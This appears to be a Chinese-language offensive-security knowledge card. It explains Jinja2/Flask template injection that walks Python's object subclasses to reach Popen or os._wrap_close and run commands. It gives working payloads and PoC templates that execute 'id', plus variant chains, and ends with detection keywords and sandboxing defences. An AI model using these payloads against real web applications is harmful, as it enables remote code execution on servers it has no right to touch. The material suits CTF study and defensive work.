---
id: web-python-ssti-jinja2-subclasses-index-rce
title: Jinja2 SSTI 全局链不可用时枚举 object 子类索引定位 Popen/os._wrap_close
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-subclasses-index
aliases:
- __subclasses__ 索引
- Jinja2 子类枚举
- Popen 索引
- os._wrap_close 利用
- SSTI 无 os 回退
tags:
- python
- jinja2
- flask
- ssti
- rce
- subclasses
- object
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:34:50+08:00'
  notes: 已对照原文核对：object 子类枚举、{% set %}/{% for %} 打印索引、原文本地 535=Popen 示例、__init__.__globals__.os.popen 及直接实例化 Popen('ls',shell=True,stdout=-1).communicate() 两条路径一致；卡片强调索引随环境变化，无硬编码误导。
---

## 一句话结论

当暴露的全局对象链拿不到 `os` 时，可从任意基础类型出发取 `object`，用 `__subclasses__()` 枚举所有已加载类，按当前环境的数字索引定位 `subprocess.Popen`、`os._wrap_close` 等类，再经其 `__init__.__globals__` 或直接实例化执行命令。

## 原理

- Python 中所有类最终继承 `object`；`''.__class__.__mro__[1]`、`range.__class__.__base__`、`0.__class__.__base__` 都能拿到 `object`。
- `object.__subclasses__()` 返回当前解释器已加载的全部直接子类列表；Flask 应用启动后，`subprocess.Popen`、`os._wrap_close`、`warnings.WarningMessage`、`_frozen_importlib.BuiltinImporter`、`ctypes.CDLL`、`codecs.StreamReaderWriter` 等常见类通常已在列表中。
- 列表只能按数字索引访问，且不同环境加载的模块不同，索引会变化，所以必须先枚举类名再取对应下标。
- 拿到类后有两种利用方式：取某个普通方法的 `__init__.__globals__['os']` 调 `popen`；或直接实例化 `Popen('cmd', shell=True, stdout=-1).communicate()[0]`，完全绕过 `__globals__`。
- 之所以成立：Jinja2 表达式可调用任意 Python 可调用对象，Python 的自省接口把整个运行时类图暴露给模板。

## 触发条件

- 存在 Jinja2/Flask SSTI 且表达式求值未被沙箱限制（`SandboxedEnvironment` 会拦截 `__subclasses__`）；
- 应用已加载 `subprocess`、`os` 等模块（Flask 应用通常满足，`subprocess` 可能因未使用而不在列表中，需枚举确认）；
- 注入长度允许 `{% set %}`/`{% for %}` 或长表达式；
- 能按环境枚举索引（不能盲用他人环境的固定下标）。

## 利用步骤

1. 取 `object`：`{{''.__class__.__mro__[1]}}` 或 `{{range.__class__.__base__}}`。
2. 枚举子类并打印索引、类名、模块：
   `{% set cs = range.__class__.__base__.__subclasses__() %}{% for c in cs %}{{ loop.index0 }}:{{ c.__name__ }}({{ c.__module__ }}) {% endfor %}`
3. 在输出中定位 `Popen (subprocess)`、`_wrap_close (os)` 等类的索引 N。
4. 经 globals 执行：`{{range.__class__.__base__.__subclasses__()[N].__init__.__globals__.os.popen('id').read()}}`。
5. 或直接实例化：`{{range.__class__.__base__.__subclasses__()[N]('id', shell=True, stdout=-1).communicate()[0]}}`。

## PoC

```jinja2
{% set cs = range.__class__.__base__.__subclasses__() %}
{% for c in cs %}{{ loop.index0 }}: {{ c.__name__ }} ({{ c.__module__ }})
{% endfor %}
```

输出示例（索引随环境变化）：

```text
534: CompletedProcess (subprocess)
535: Popen (subprocess)
```

执行：

```jinja2
{{range.__class__.__base__.__subclasses__()[535].__init__.__globals__.os.popen('id').read()}}
```

直接实例化（不依赖 `__globals__`）：

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[535]('id', shell=True, stdout=-1).communicate()[0]}}
```

## 变体与关联

- 变体：`os._wrap_close.__init__.__globals__['system']`、`warnings.catch_warnings` 的 `__init__.__globals__`、`_frozen_importlib.BuiltinImporter.load_module('os')`；`ctypes.CDLL('libc.so.6').system('id')`（受权限/路径影响，未必可用）。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]（更短的全局对象链）；[[web-python-ssti-jinja2-runtime-exported-pollution]]（另一条不需要子类索引的代码注入路径）。
- 坑点：不要硬编码索引；`subprocess` 未加载时列表中没有 `Popen`，需要找 `os._wrap_close` 或先触发加载；沙箱环境会过滤 `__subclasses__`/`__mro__`。
- 影响边界：需要在模板中执行表达式；若只能注入模板变量值则不成立。

## 检测与防御

- 检测：请求含 `__subclasses__`、`__mro__`、`__base__`、`__bases__`、`Popen`、`_wrap_close`；响应中出现大量 `索引: 类名 (模块)` 枚举格式；模板渲染耗时异常（遍历数百子类）。
- 防御：使用 `SandboxedEnvironment` 并禁用 `__subclasses__`、`__globals__`、`__mro__` 等属性；不把用户输入当模板源码；对模板表达式做语法级白名单；最小权限运行，禁用 `subprocess`/`os.system` 能力。
